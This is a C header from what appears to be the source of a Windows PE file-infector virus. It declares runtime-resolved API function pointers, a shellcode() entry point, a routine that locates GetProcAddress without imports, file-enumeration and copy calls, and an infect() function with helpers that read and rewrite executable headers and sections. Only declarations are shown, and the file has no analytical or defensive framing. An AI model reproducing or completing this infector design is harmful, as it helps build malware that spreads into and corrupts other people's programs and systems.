#pragma once
#define _CRT_SECURE_NO_WARNINGS_GLOBALS
#define _CRT_SECURE_NO_WARNINGS
#ifndef HEADER
#define HEADER
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>
#include<tchar.h>
#include <Locale.h>
#include <winternl.h>
#include "pm.h"
#endif

typedef FARPROC(__stdcall* _GetProcAddress)(
    _In_ HMODULE hModule,
    _In_ LPCSTR lpProcName
    );
typedef HANDLE(__stdcall* _FindFirstFile)(
    _In_ LPCWSTR lpFileName,
    _Out_ LPWIN32_FIND_DATAW lpFindFileData
    );
typedef  int(__stdcall* _GetModuleFileNameW)(
    _In_opt_ HMODULE hModule,
    _Out_writes_to_(nSize, ((return < nSize) ? (return +1) : nSize)) LPWSTR lpFilename,
    _In_ DWORD nSize
    );
typedef BOOL(__stdcall* _CreateDirectoryW)(
    _In_ LPCWSTR lpPathName,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );
typedef int (_cdecl* _wmemcpy_s)(
    _Out_writes_to_opt_(_N1, _N) wchar_t* _S1,
    _In_                         rsize_t        _N1,
    _In_reads_opt_(_N)           wchar_t const* _S2,
    _In_                         rsize_t        _N
); // 注意调用方式
typedef BOOL (__stdcall* _CopyFileW)(
    _In_ LPCWSTR lpExistingFileName,
    _In_ LPCWSTR lpNewFileName,
    _In_ BOOL bFailIfExists
);
typedef int(__stdcall* _lstrlenW)(
    _In_ LPCWSTR lpString
);
typedef HMODULE(__stdcall* _LoadLibraryA)(
    _In_ LPCSTR lpLibFileName
    );
typedef BOOL(__stdcall* _FindNextFileW)(
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAW lpFindFileData
);
typedef BOOL(__stdcall* _FindClose)(
    _Inout_ HANDLE hFindFile
);
typedef void* (__cdecl* _memset)(
    _Out_writes_bytes_all_(_Size) void* _Dst,
    _In_                          int    _Val,
    _In_                          size_t _Size
);
typedef void*(__cdecl *_memcpy)(
    _Out_writes_bytes_all_(_Size) void* _Dst,
    _In_reads_bytes_(_Size)       void const* _Src,
    _In_                          size_t      _Size
);
typedef BOOL(__stdcall * _CloseHandle)(
    _In_ _Post_ptr_invalid_ HANDLE hObject
);
typedef void (__cdecl* _free)(
    _Pre_maybenull_ _Post_invalid_ void* _Block
);
typedef void* (__cdecl* _malloc)(
    _In_ _CRT_GUARDOVERFLOW size_t _Size
);
typedef HANDLE (__stdcall * _CreateFileW)(
    _In_ LPCWSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
);
typedef DWORD(__stdcall* _SetFilePointer)(
    _In_ HANDLE hFile,
    _In_ LONG lDistanceToMove,
    _Inout_opt_ PLONG lpDistanceToMoveHigh,
    _In_ DWORD dwMoveMethod
);
typedef BOOL(__stdcall* _ReadFile)(
    _In_ HANDLE hFile,
    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToRead,
    _Out_opt_ LPDWORD lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef BOOL(__stdcall * _WriteFile)(
    _In_ HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToWrite,
    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);

typedef struct func_
{
    _GetProcAddress GetProcAddress;
    _FindFirstFile FindFirstFileW;
    _GetModuleFileNameW GetModuleFileNameW;
    _CreateDirectoryW CreateDirectoryW;
    _wmemcpy_s wmemcpy_s;
    _CopyFileW CopyFileW;
    _lstrlenW lstrlenW;
    _LoadLibraryA LoadLibraryA;
    _FindNextFileW FindNextFileW;
    _FindClose FindClose;
    _memset memset;
    _memcpy memcpy;
    _CloseHandle CloseHandle;
    _free free;
    _malloc malloc;
    _CreateFileW CreateFileW;
    _SetFilePointer SetFilePointer;
    _ReadFile ReadFile;
    _WriteFile WriteFile;
}func;

int shellcode();
BOOL wcmp(WCHAR* str1, WCHAR* str2);
BOOL cmp(char* str1, char* str2);
LPVOID GetModuleBase(WCHAR* pPeName);
LPVOID getAddressOfGetProcAddr(LPVOID KernelBase);
void infect(WCHAR* filename, func f);
BOOL setBytes(BYTE* src, size_t size, long offset, HANDLE hFile, func f);
BOOL getBytes(BYTE* dst, size_t size, long offset, HANDLE hFile, func f);
PE init_file(WCHAR* filename, func f);
IMAGE_DOS_HEADER get_IMAGE_DOS_HEADER(HANDLE hFile, func f);
_IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(HANDLE hFile, PE p, func f);
void get_IMAGE_SECTION_HEADERS(_IMAGE_SECTION_HEADER** dst, int cnt, LONG e_lfanew, HANDLE hFile, func f);
func init_function();